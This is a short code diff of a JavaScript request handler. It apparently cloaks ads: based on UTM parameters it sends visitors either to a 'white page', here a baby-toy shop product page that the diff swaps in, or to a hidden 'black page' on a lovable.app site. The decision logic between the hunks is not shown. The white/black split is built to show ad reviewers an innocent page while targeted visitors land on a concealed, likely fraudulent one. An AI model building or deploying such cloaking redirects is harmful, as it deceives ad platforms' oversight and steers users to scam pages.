@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.babyelegance.com/products/little-locks-flat-step-safety-gate?_gl=1*1rq09s0*_up*MQ..*_ga*OTc5MTQ2NzkuMTc2MDM1ODk3NQ..*_ga_82QW7YCV3D*czE3NjAzNTg5NzUkbzEkZzAkdDE3NjAzNTg5NzUkajYwJGwwJGgyMDM5OTA3MTk3";
+    const whitePageURL = "https://www.lespetits.fr/en/collections/baby-toys/products/plush-lapland-cozy-dinkum-bunny-moppet";
     const blackPageURL = "https://casssshlov.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
